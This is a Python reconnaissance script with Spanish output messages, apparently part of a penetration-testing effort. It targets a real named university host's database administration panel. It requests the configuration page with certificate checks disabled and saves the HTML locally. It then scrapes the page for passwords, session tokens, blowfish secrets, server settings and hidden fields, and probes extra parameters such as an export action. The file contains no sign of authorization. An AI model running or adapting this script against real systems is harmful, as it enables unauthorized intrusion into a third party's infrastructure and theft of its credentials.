#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
from urllib.parse import urlparse
import re, urllib3
urllib3.disable_warnings()

base_url = 'https://orcl.uns.edu.pe'
s = requests.Session()
s.verify = False
s.headers.update({'User-Agent': 'Mozilla/5.0'})

print("=" * 60)
print("ANALIZANDO /configuration PAGE")
print("=" * 60)

# Get the configuration page
resp = s.get(f"{base_url}/index.php?route=/configuration", timeout=5)
print(f"HTTP {resp.status_code}, len={len(resp.text)}")

# Save full content for analysis
with open(r"C:\Users\Leguion T\Desktop\plan te pent\prueba\config_page_analysis.html", "w") as f:
    f.write(resp.text)

# Look for cfg references
print("\n--- Buscando cfg references ---")
cfg_matches = re.findall(r"cfg\[.*?\]", resp.text)
if cfg_matches:
    print(f"  {len(cfg_matches)} referencias a cfg encontradas:")
    for m in cfg_matches[:20]:
        print(f"    {m}")

# Look for password references
print("\n--- Buscando password/secret references ---")
pwd_matches = re.findall(r'(?:password|pwd|secret|key|pass|auth)\s*[=:]\s*["\']?([^"\'\s,}]+)', resp.text, re.IGNORECASE)
if pwd_matches:
    print(f"  {len(pwd_matches)} valores encontrados:")
    for p in pwd_matches[:20]:
        print(f"    {p}")

# Look for any JavaScript variables with config
print("\n--- Buscando JS con configuracion ---")
js_blocks = re.findall(r'<script[^>]*>(.*?)</script>', resp.text, re.DOTALL)
for i, js in enumerate(js_blocks):
    if 'cfg[' in js or 'Servers' in js or 'config' in js.lower():
        print(f"  JS block {i}: contiene config")
        # Find cfg values
        cfg_in_js = re.findall(r"cfg\[(\w+)\]\s*=\s*['\"]([^'\"]+)['\"]", js)
        if cfg_in_js:
            for k, v in cfg_in_js[:20]:
                print(f"    cfg[{k}] = '{v}'")
        # Find servers array
        srv_in_js = re.findall(r"Servers.*?\[.*?\]", js)
        if srv_in_js:
            for sv in srv_in_js[:5]:
                print(f"    Server: {sv[:100]}")

# Look for the CommonParams object that has token
print("\n--- Buscando CommonParams con token ---")
common_params = re.findall(r'CommonParams\.setAll\(\{([^}]+)\}\)', resp.text)
if common_params:
    for cp in common_params:
        print(f"  CommonParams: {cp}")
        # Extract token
        token = re.search(r'token.*?["\']([^"\']+)["\']', cp)
        if token:
            print(f"  Token: {token.group(1)}")
        # Extract server info
        server = re.search(r'server.*?["\']([^"\']+)["\']', cp)
        if server:
            print(f"  Server: {server.group(1)}")

# Look for blowfish secret
print("\n--- Buscando blowfish_secret ---")
blowfish = re.findall(r'blowfish.*?["\']([^"\']+)["\']', resp.text)
if blowfish:
    print(f"  Blowfish secrets: {blowfish}")

# Look for any hidden fields
print("\n--- Buscando hidden inputs ---")
hidden = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']', resp.text)
if hidden:
    print(f"  {len(hidden)} hidden inputs:")
    for name, value in hidden[:20]:
        print(f"    {name} = {value}")

# Look for any config data in JSON
print("\n--- Buscando JSON con config ---")
json_matches = re.findall(r'({[^}]*cfg[^}]*})', resp.text)
if json_matches:
    for jm in json_matches[:5]:
        print(f"  JSON: {jm[:200]}")

# Also try to access config page with different params
print("\n--- Probando /configuration con params ---")
config_urls = [
    f"{base_url}/index.php?route=/configuration&server=1",
    f"{base_url}/index.php?route=/configuration&page=config",
    f"{base_url}/index.php?route=/configuration&action=export",
]

for url in config_urls:
    try:
        resp = s.get(url, timeout=5)
        if resp.status_code == 200 and len(resp.text) > 100:
            # Check for actual config data
            if re.search(r"cfg\[.*?\].*?=", resp.text) or 'blowfish' in resp.text.lower():
                print(f"  {url[:50]} -> Contiene datos de configuracion!")
            else:
                print(f"  {url[:50]} -> HTTP {resp.status_code} (login form)")
    except:
        pass

# Read the saved HTML and look for specific things
print("\n--- Analisis del HTML guardado ---")
with open(r"C:\Users\Leguion T\Desktop\plan te pent\prueba\config_page_analysis.html", "r") as f:
    content = f.read()

# Look for any server configuration
print("Buscando cfg[Servers]:")
srv_matches = re.findall(r"cfg\[Servers\]\[.*?\]\[.*?\].*?=.*?(?:['\"][^'\"]+['\"]|\d+)", content)
if srv_matches:
    for sm in srv_matches[:20]:
        print(f"  {sm}")

# Look for ANY value assignment
print("\nBuscando assignments de configuracion:")
all_assigns = re.findall(r"(\w+)\s*=\s*['\"]([^'\"]+)['\"]", content)
config_assigns = [(k,v) for k,v in all_assigns if any(kw in k.lower() for kw in ['cfg', 'server', 'host', 'port', 'user', 'pass', 'auth', 'blow', 'secret', 'token'])]
if config_assigns:
    for k, v in config_assigns[:30]:
        print(f"  {k} = {v}")
else:
    print("  No se encontraron assignments de configuracion")

# Show the actual content structure
print("\n--- Estructura del HTML ---")
# Find all form elements
forms = re.findall(r'<form[^>]*>', resp.text)
print(f"Forms: {forms}")
# Find all input elements
inputs = re.findall(r'<input[^>]*>', resp.text)
print(f"Inputs ({len(inputs)}):")
for inp in inputs[:30]:
    if 'hidden' in inp.lower() or 'token' in inp.lower() or 'name' in inp.lower():
        print(f"  {inp}")

# Look for the actual page content (not login)
print("\n--- Verificando si muestra datos de configuracion ---")
if '<pre' in resp.text:
    print("  [!] Contenido <pre> encontrado (posible configuracion en texto!)")
    pre_match = re.search(r'<pre[^>]*>(.*?)</pre>', resp.text, re.DOTALL)
    if pre_match:
        print(f"  Contenido: {pre_match.group(1)[:500]}")
if 'configuration' in resp.text.lower() and 'blowfish' in resp.text.lower():
    print("  [!] Configuracion con blowfish encontrada!")
elif 'cfg[' in resp.text:
    print("  [+] Hay referencias a cfg[] en el HTML")
elif 'login' in resp.text.lower():
    print("  [+] Es el formulario de login")
